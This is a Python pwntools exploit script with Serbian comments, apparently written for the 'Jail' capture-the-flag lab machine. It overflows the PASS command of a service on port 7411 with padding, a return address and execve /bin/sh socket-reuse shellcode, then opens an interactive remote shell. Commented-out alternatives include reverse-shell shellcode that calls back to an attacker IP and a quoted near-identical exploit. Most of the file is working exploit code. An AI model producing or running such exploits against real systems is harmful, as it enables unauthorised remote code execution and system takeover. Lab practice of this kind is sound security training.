#the kitchen sink approach
from pwn import *

#increased the verbosity level
#context.log_level = 'debug'

# The target architecture can generally be specified as an argument to the routine that requires it.

# >>> asm('nop')
# '\x90'
# >>> asm('nop', arch='arm')
# '\x00\xf0 \xe3'

# However, it can also be set once in the global context. The operating system, word size, and endianness can also be set here.

# >>> context.arch      = 'i386'
# >>> context.os        = 'linux'
# >>> context.endian    = 'little'
# >>> context.word_size = 32

# Additionally, you can use a shorthand to set all of the values at once.

# >>> asm('nop')
# '\x90'
# >>> context(arch='arm', os='linux', endian='big', word_size=32)
# >>> asm('nop')
# '\xe3 \xf0\x00'


context(arch='i386', os='linux')
#definisemo promenljive
#Centos masina
# HOST = "192.168.85.130"
# PORT = 7411

#Jail
HOST = "10.10.10.34"
PORT = 7411

#kreirano preko gdb -> pattern create 50
#junk = "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA"
#nije mi jasno zasto ovo
#ako gdb pokusa da izvrsi ovaj opcode (\xCC) uradi break
#lakse za debagovanje
#ako kojim slucajem zavrsimo u junk mem. lokacijama
junk = "\xCC" * 28


# pwnlib.util.packing.p32(number, sign, endian, ...) 
# Packs an 32-bit integer

# Parameters:	
# number (int) - Number to convert
# endianness (str) - Endianness of the converted integer ("little"/"big")
# sign (str) - Signedness of the converted integer ("unsigned"/"signed")
# kwargs (dict) - Arguments passed to context.local(), such as endian or signed.
# Returns:	
# The packed number as a string

#junk + mem + buf
#junk je offset 28, mem je 4 i to bi trebalo da je 32, i to nas postavlja na buf
#zasto je mem 4 bajta (32 bitna memorija mozda)

#mem = p32(0xffb21d20+32)
#mem. lokacija password offset-a na Jail-u
mem = p32(0xffffd610+32)

#ovo je shellcode za buffer overflow
#kada program naleti na ovaj shellcode u EIP-u dobijamo shell
# http://shell-storm.org/shellcode/files/shellcode-833.php


# x32 shell shellcode
# buf = ""
# buf += "\x68"
# #buf += "\xC0\xA8\x55\x81"  # <- IP Number "192.168.85.129", IP Kali masine
# #ne Centos masine jebem te budalo
# #IP Jail-a
# buf += "\x0A\x0A\x0E\x1B" #<- 10.10.14.27, IP Kail-a na VPN-u
# buf += "\x5e\x66\x68"
# buf += "\xd9\x03"          # <- Port Number "55555"
# buf += "\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
# buf += "\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
# buf += "\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
# buf += "\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
# buf += "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
# buf += "\xeb\xce"


# Socket Reuse x32 
# kada odradimo buffer overflow, u EIP registru ce se nalaziti 
# novi shellcode koji otvara shell na postojecem socketu 
# (umesto da program pukne ko zvecka)
# Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes)
# https://www.exploit-db.com/exploits/34060

buf = ""
buf += "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
buf += "\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
buf += "\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
buf += "\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
buf += "\x89\xe3\x31\xc9\xcd\x80"


# pwnlib.tubes.sock - Sockets

# class pwnlib.tubes.remote.remote(host, port, fam='any', typ='tcp', timeout=pwnlib.timeout.Timeout.default, ssl=False, sock=None, level=None

# Creates a TCP or UDP-connection to a remote host. It supports both IPv4 and IPv6.

# The returned object supports all the methods from pwnlib.tubes.sock and pwnlib.tubes.tube.

# Parameters:	
# host (str) - The host to connect to.
# port (int) - The port to connect to.
# fam - The string "any", "ipv4" or "ipv6" or an integer to pass to socket.getaddrinfo().
# typ - The string "tcp" or "udp" or an integer to pass to socket.getaddrinfo().
# timeout - A positive number, None or the string "default".
# ssl (bool) - Wrap the socket with SSL
# sock (socket) - Socket to inherit, rather than connecting






connection = remote(HOST, PORT)


# pwnlib.tubes
# recvuntil(delims, timeout=default)  
# Receive data until one of delims is encountered.

# If the request is not satisfied before timeout seconds pass, all data is buffered and an empty bytes (b'') is returned.

# Parameters:	
# delims (bytes,str,tuple) - String of delimiters characters, or list of delimiter strings.
# drop (bool) - Drop the ending. If True it is removed from the end of the return value.

connection.recvuntil("OK Ready. Send USER command.")

# send(data)[source]
# Sends data.
# sendline(data)
# Shorthand for t.send(data + t.newline).

connection.sendline("DEBUG")
connection.recvuntil("OK DEBUG mode on.")
connection.sendline("USER admin")
connection.recvuntil("OK Send PASS command.")
#sam buffer overflow
connection.sendline("PASS " + junk + mem + buf)

#dodato za Jail masinu
# interactive(prompt=pwnlib.term.text.bold_red('$') + ' ')
# Does simultaneous reading and writing to the tube. 
# In principle this just connects the tube to standard in and standard out, 
# but in practice this is much more usable, since we are using pwnlib.term 
# to print a floating prompt.

# Thus it only works in while in pwnlib.term.term_mode.
connection.interactive()

# iz Jail.pdf-a
# Appendix A
# from pwn import *
# shellcode =
# "\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xc
# d\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x7
# 3\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
# payload = "A"*28 + p32(0xffffd630) + shellcode
# r = remote('10.10.10.34', 7411)
# print r.recv(1024)
# r.sendline('USER admin')
# print r.recv(1024)
# r.sendline('PASS ' + payload)
# r.interactive()











































































































